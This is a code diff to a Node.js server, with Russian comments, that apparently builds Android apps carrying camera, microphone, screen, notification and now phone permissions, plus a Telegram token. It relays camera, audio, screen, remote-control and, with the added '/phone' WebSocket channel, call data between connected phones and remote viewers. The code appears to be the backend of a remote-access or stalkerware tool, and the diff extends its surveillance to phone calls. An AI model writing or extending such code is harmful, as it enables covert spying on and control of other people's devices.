@@ -203,6 +203,7 @@ app.post('/api/build/github', h(async (req, res) => {
           mic_permission: permList.includes('RECORD_AUDIO') ? 'true' : 'false',
           screen_permission: permList.includes('SCREEN') ? 'true' : 'false',
           notifications_permission: permList.includes('NOTIFICATIONS') ? 'true' : 'false',
+          phone_permission: permList.includes('PHONE') ? 'true' : 'false',
           tg_token: tgToken || '',
           tg_chat_id: tgChatId || '',
         },
@@ -264,6 +265,7 @@ const wssCamera = new WebSocketServer({ noServer: true });
 const wssAudio = new WebSocketServer({ noServer: true });
 const wssScreen = new WebSocketServer({ noServer: true });
 const wssControl = new WebSocketServer({ noServer: true });
+const wssPhone = new WebSocketServer({ noServer: true });
 
 server.on('upgrade', (req, socket, head) => {
   const { pathname } = new URL(req.url, 'http://localhost');
@@ -278,6 +280,8 @@ server.on('upgrade', (req, socket, head) => {
     wssScreen.handleUpgrade(req, socket, head, (ws) => wssScreen.emit('connection', ws, req));
   } else if (pathname === '/control') {
     wssControl.handleUpgrade(req, socket, head, (ws) => wssControl.emit('connection', ws, req));
+  } else if (pathname === '/phone') {
+    wssPhone.handleUpgrade(req, socket, head, (ws) => wssPhone.emit('connection', ws, req));
   } else {
     socket.destroy();
   }
@@ -598,6 +602,46 @@ wssControl.on('connection', (ws, req) => {
       if (phone && phone.readyState === phone.OPEN) phone.send(isBinary ? data : data.toString());
     });
     ws.on('close', () => controlViewers.delete(ws));
+  }
+});
+
+// ---- Телефон / Звонки ----
+const phoneCallPhones = new Map(); // ip → ws
+const phoneCallViewers = new Set();
+
+wssPhone.on('connection', (ws, req) => {
+  const params = new URL(req.url, 'http://localhost').searchParams;
+  const role = params.get('role') || 'viewer';
+  const ip = normalizeIp(req.socket.remoteAddress);
+  console.log(`[PHONE] connected: role=${role} from ${ip}`);
+
+  if (role === 'phone') {
+    phoneCallPhones.set(ip, ws);
+    for (const v of phoneCallViewers) {
+      if (v.readyState === v.OPEN) v.send(JSON.stringify({ type: 'phone-connected', connected: true }));
+    }
+    ws.on('message', (data, isBinary) => {
+      if (isBinary) return;
+      const str = data.toString();
+      for (const v of phoneCallViewers) {
+        if (v.readyState === v.OPEN) v.send(str);
+      }
+    });
+    ws.on('close', () => {
+      if (phoneCallPhones.get(ip) === ws) phoneCallPhones.delete(ip);
+      for (const v of phoneCallViewers) {
+        if (v.readyState === v.OPEN) v.send(JSON.stringify({ type: 'phone-connected', connected: phoneCallPhones.size > 0 }));
+      }
+    });
+  } else {
+    phoneCallViewers.add(ws);
+    ws.send(JSON.stringify({ type: 'phone-connected', connected: phoneCallPhones.size > 0 }));
+    ws.on('message', (data, isBinary) => {
+      const activePhone = activePhoneIp ? phoneCallPhones.get(activePhoneIp) : null;
+      const phone = activePhone || [...phoneCallPhones.values()].find((w) => w.readyState === w.OPEN);
+      if (phone && phone.readyState === phone.OPEN) phone.send(isBinary ? data : data.toString());
+    });
+    ws.on('close', () => phoneCallViewers.delete(ws));
   }
 });
 
